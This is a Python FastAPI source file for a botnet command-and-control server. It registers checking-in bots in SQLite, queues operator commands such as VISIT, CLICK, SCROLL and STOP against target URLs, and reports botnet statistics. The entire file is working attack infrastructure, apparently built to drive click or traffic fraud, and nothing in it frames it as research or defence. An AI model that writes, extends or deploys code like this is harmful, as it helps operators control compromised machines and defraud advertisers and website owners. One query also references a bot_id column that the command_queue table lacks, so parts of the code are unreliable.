from fastapi import FastAPI, Query, HTTPException
from fastapi.responses import JSONResponse
import uvicorn
import asyncio
import json
import sqlite3
import logging
from datetime import datetime, timedelta
from typing import List, Dict, Any, Optional
import threading
from contextlib import asynccontextmanager

# --- Logging Configuration ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# --- Configuration ---
C2_PORT = 5000
C2_HOST = "0.0.0.0"
DB_PATH = "c2_botnet.db"
BOT_ACTIVE_THRESHOLD = 300  # 5 minutes
COMMAND_RETENTION_DAYS = 7

# --- Global State ---
bot_status_cache = {}
cache_lock = asyncio.Lock()


class BotnetDatabase:
    """
    Manages persistent storage for bot status and command history.
    """

    def __init__(self, db_path: str = DB_PATH):
        self.db_path = db_path
        self._init_db()

    def _init_db(self) -> None:
        """Initialize the database schema."""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        # Bot status table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS bot_status (
                bot_id TEXT PRIMARY KEY,
                ip_address TEXT NOT NULL,
                last_check_in REAL NOT NULL,
                user_agent TEXT,
                status TEXT DEFAULT 'active',
                total_commands_executed INTEGER DEFAULT 0,
                created_at REAL NOT NULL
            )
        """)

        # Command history table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                bot_id TEXT NOT NULL,
                command_json TEXT NOT NULL,
                issued_at REAL NOT NULL,
                executed_at REAL,
                status TEXT DEFAULT 'pending',
                FOREIGN KEY (bot_id) REFERENCES bot_status(bot_id)
            )
        """)

        # Global command queue table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS command_queue (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                command_json TEXT NOT NULL,
                target_bots TEXT,
                created_at REAL NOT NULL,
                executed_count INTEGER DEFAULT 0,
                status TEXT DEFAULT 'pending'
            )
        """)

        conn.commit()
        conn.close()
        logger.info("[+] Database initialized")

    def register_bot(self, bot_id: str, ip_address: str, user_agent: str = None) -> None:
        """Register or update a bot in the database."""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        current_time = datetime.now().timestamp()

        cursor.execute("""
            INSERT OR REPLACE INTO bot_status (bot_id, ip_address, last_check_in, user_agent, created_at)
            VALUES (?, ?, ?, ?, ?)
        """, (bot_id, ip_address, current_time, user_agent, current_time))

        conn.commit()
        conn.close()

    def get_bot_status(self, bot_id: str) -> Optional[Dict[str, Any]]:
        """Retrieve bot status from the database."""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute("SELECT * FROM bot_status WHERE bot_id = ?", (bot_id,))
        row = cursor.fetchone()
        conn.close()

        if row:
            return {
                "bot_id": row[0],
                "ip_address": row[1],
                "last_check_in": row[2],
                "user_agent": row[3],
                "status": row[4],
                "total_commands_executed": row[5],
                "created_at": row[6],
            }
        return None

    def get_all_bots(self) -> List[Dict[str, Any]]:
        """Retrieve all bots from the database."""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute("SELECT * FROM bot_status")
        rows = cursor.fetchall()
        conn.close()

        return [
            {
                "bot_id": row[0],
                "ip_address": row[1],
                "last_check_in": row[2],
                "user_agent": row[3],
                "status": row[4],
                "total_commands_executed": row[5],
                "created_at": row[6],
            }
            for row in rows
        ]

    def enqueue_command(self, command: Dict[str, Any], target_bots: Optional[List[str]] = None) -> int:
        """Add a command to the global queue."""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        current_time = datetime.now().timestamp()
        target_bots_json = json.dumps(target_bots) if target_bots else None

        cursor.execute("""
            INSERT INTO command_queue (command_json, target_bots, created_at)
            VALUES (?, ?, ?)
        """, (json.dumps(command), target_bots_json, current_time))

        command_id = cursor.lastrowid
        conn.commit()
        conn.close()

        logger.info(f"[+] Command {command_id} enqueued")
        return command_id

    def get_pending_commands(self, bot_id: str) -> List[Dict[str, Any]]:
        """Retrieve pending commands for a specific bot."""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute("""
            SELECT id, command_json FROM command_queue
            WHERE status = 'pending' AND (target_bots IS NULL OR json_extract(target_bots, '$') LIKE ?)
            ORDER BY created_at ASC
        """, (f'%"{bot_id}"%',))

        rows = cursor.fetchall()
        conn.close()

        return [{"id": row[0], "command": json.loads(row[1])} for row in rows]

    def mark_command_executed(self, command_id: int, bot_id: str) -> None:
        """Mark a command as executed by a bot."""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        current_time = datetime.now().timestamp()

        cursor.execute("""
            UPDATE command_queue SET executed_count = executed_count + 1 WHERE id = ?
        """, (command_id,))

        cursor.execute("""
            INSERT INTO command_history (bot_id, command_json, issued_at, executed_at, status)
            SELECT bot_id, command_json, created_at, ?, 'executed'
            FROM command_queue WHERE id = ?
        """, (current_time, command_id))

        conn.commit()
        conn.close()

    def cleanup_old_data(self) -> None:
        """Clean up old command history and inactive bots."""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cutoff_date = (datetime.now() - timedelta(days=COMMAND_RETENTION_DAYS)).timestamp()

        cursor.execute("DELETE FROM command_history WHERE issued_at < ?", (cutoff_date,))
        cursor.execute("UPDATE bot_status SET status = 'inactive' WHERE last_check_in < ?", (cutoff_date,))

        conn.commit()
        conn.close()
        logger.info("[+] Database cleanup completed")


# --- Database Instance ---
db = BotnetDatabase()


@asynccontextmanager
async def lifespan(app: FastAPI):
    """Manage application lifecycle."""
    logger.info("[*] C2 Server starting up")
    # Startup
    yield
    # Shutdown
    logger.info("[*] C2 Server shutting down")


# --- FastAPI Application ---
app = FastAPI(title="Advanced C2 Server", version="2.0", lifespan=lifespan)


@app.get("/c2/get_command")
async def get_command(
    bot_id: str = Query(..., description="Unique bot identifier"),
    ip: Optional[str] = Query(None, description="Bot's IP address"),
    user_agent: Optional[str] = Query(None, description="Bot's User-Agent"),
) -> JSONResponse:
    """
    Endpoint for bots to check in and receive commands.
    
    This endpoint:
    1. Registers/updates the bot in the database
    2. Retrieves pending commands for the bot
    3. Returns commands in a structured format
    """
    try:
        # Register bot
        db.register_bot(bot_id, ip or "unknown", user_agent)
        logger.info(f"[+] Bot check-in: {bot_id} from {ip}")

        # Retrieve pending commands
        commands = db.get_pending_commands(bot_id)

        # Build response
        response = {
            "bot_id": bot_id,
            "timestamp": datetime.now().isoformat(),
            "commands": [cmd["command"] for cmd in commands],
            "command_count": len(commands),
        }

        return JSONResponse(content=response, status_code=200)

    except Exception as e:
        logger.error(f"[-] Error in get_command: {e}")
        return JSONResponse(content={"error": str(e)}, status_code=500)


@app.get("/c2/status")
async def get_status() -> JSONResponse:
    """
    Endpoint for operators to view botnet status.
    
    Returns:
    - Total bots seen
    - Active bots (checked in within last 5 minutes)
    - Inactive bots
    - Detailed bot information
    """
    try:
        all_bots = db.get_all_bots()
        current_time = datetime.now().timestamp()

        active_bots = [
            bot for bot in all_bots
            if (current_time - bot["last_check_in"]) < BOT_ACTIVE_THRESHOLD
        ]
        inactive_bots = [
            bot for bot in all_bots
            if (current_time - bot["last_check_in"]) >= BOT_ACTIVE_THRESHOLD
        ]

        status_report = {
            "timestamp": datetime.now().isoformat(),
            "total_bots_seen": len(all_bots),
            "active_bots": len(active_bots),
            "inactive_bots": len(inactive_bots),
            "active_bots_list": active_bots,
            "inactive_bots_list": inactive_bots,
        }

        logger.info(f"[+] Status report: {len(active_bots)} active, {len(inactive_bots)} inactive")
        return JSONResponse(content=status_report, status_code=200)

    except Exception as e:
        logger.error(f"[-] Error in get_status: {e}")
        return JSONResponse(content={"error": str(e)}, status_code=500)


@app.post("/c2/issue_command")
async def issue_command(
    command: Dict[str, Any],
    target_bots: Optional[List[str]] = None,
) -> JSONResponse:
    """
    Endpoint for operators to issue commands to bots.
    
    Command format:
    {
        "action": "VISIT|CLICK|SCROLL|SLEEP|SEQUENCE|STOP",
        "target_url": "https://...",
        "dwell_time": 5,
        ...
    }
    """
    try:
        command_id = db.enqueue_command(command, target_bots)
        
        response = {
            "status": "success",
            "command_id": command_id,
            "target_bots": target_bots or "all",
            "timestamp": datetime.now().isoformat(),
        }

        logger.info(f"[+] Command {command_id} issued to {len(target_bots) if target_bots else 'all'} bot(s)")
        return JSONResponse(content=response, status_code=200)

    except Exception as e:
        logger.error(f"[-] Error in issue_command: {e}")
        return JSONResponse(content={"error": str(e)}, status_code=500)


@app.get("/c2/botnet_stats")
async def botnet_stats() -> JSONResponse:
    """
    Endpoint for detailed botnet statistics.
    """
    try:
        all_bots = db.get_all_bots()
        current_time = datetime.now().timestamp()

        total_commands_executed = sum(bot["total_commands_executed"] for bot in all_bots)
        avg_uptime = sum(
            (current_time - bot["created_at"]) for bot in all_bots
        ) / len(all_bots) if all_bots else 0

        stats = {
            "total_bots": len(all_bots),
            "total_commands_executed": total_commands_executed,
            "average_bot_uptime_seconds": avg_uptime,
            "timestamp": datetime.now().isoformat(),
        }

        return JSONResponse(content=stats, status_code=200)

    except Exception as e:
        logger.error(f"[-] Error in botnet_stats: {e}")
        return JSONResponse(content={"error": str(e)}, status_code=500)


@app.delete("/c2/cleanup")
async def cleanup() -> JSONResponse:
    """
    Endpoint to trigger database cleanup (remove old data).
    """
    try:
        db.cleanup_old_data()
        return JSONResponse(content={"status": "cleanup completed"}, status_code=200)
    except Exception as e:
        logger.error(f"[-] Error in cleanup: {e}")
        return JSONResponse(content={"error": str(e)}, status_code=500)


@app.get("/health")
async def health_check() -> JSONResponse:
    """
    Health check endpoint.
    """
    return JSONResponse(content={"status": "healthy"}, status_code=200)


def run_c2_server():
    """
    Start the FastAPI C2 server with Uvicorn.
    """
    logger.info(f"[*] C2 Server starting on {C2_HOST}:{C2_PORT}")
    uvicorn.run(
        app,
        host=C2_HOST,
        port=C2_PORT,
        log_level="info",
        access_log=True,
    )


if __name__ == "__main__":
    run_c2_server()
